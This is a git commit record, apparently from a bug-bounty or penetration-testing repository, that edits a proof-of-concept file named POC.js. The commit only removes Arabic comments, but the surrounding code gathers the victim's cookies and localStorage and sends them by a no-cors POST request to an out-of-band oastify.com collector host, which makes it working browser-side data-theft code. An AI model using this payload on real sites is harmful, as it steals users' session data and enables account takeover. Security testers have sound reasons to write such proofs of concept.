925b3ccf5f4b633a4e2096519f53e1aa954ebd5e
Hussein Mahmoud <housien.a.khalek19@gmail.com>
2026-04-29 20:12:10 +0300

    Fix formatting in fetch request for exfilData

--- POC.js
+++ POC.js
@@ -8,7 +8,7 @@ var userStorage = JSON.stringify(localStorage);
 var exfilData = "===== COOKIES =====\n" + userCookies + "\n\n===== LOCAL STORAGE =====\n" + userStorage;
 
 fetch("https://2nqfrsyf5u919k496pa4iwbu9lfc33rs.oastify.com/", {
-    method: "POST",       // استخدام POST عشان الداتا الكبيرة
-    mode: "no-cors",      // تخطي إيرور الـ CORS
-    body: exfilData       // حط الداتا كلها هنا
+    method: "POST",  
+    mode: "no-cors",     
+    body: exfilData     
 });
